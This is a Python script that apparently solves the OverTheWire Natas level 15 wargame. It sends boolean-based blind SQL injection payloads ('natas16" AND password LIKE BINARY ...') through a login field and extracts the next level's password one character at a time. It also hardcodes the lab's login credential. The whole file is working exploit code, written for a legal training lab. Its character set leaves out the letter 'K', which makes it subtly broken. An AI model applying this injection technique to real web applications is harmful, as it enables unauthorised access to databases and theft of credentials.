import requests
from requests.auth import HTTPBasicAuth

natas_auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRSTUVWXYZ1234567890'
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
filtered = ''
passwd = ''

for char in cand:
	Data = {'username' : 'natas16" AND password LIKE BINARY "%' + char + '%'}
	r = requests.post(url, auth=natas_auth, data=Data)
	if 'exists' in r.text:
		filtered += char
		print(filtered)

for i in range(0,32):
	for char in filtered:
		Data = {'username' : 'natas16" AND password LIKE BINARY "' +passwd + char + '%'}
		r = requests.post(url, auth=natas_auth, data=Data)
		if 'exists' in r.text:
			passwd += char
			print(passwd)
			break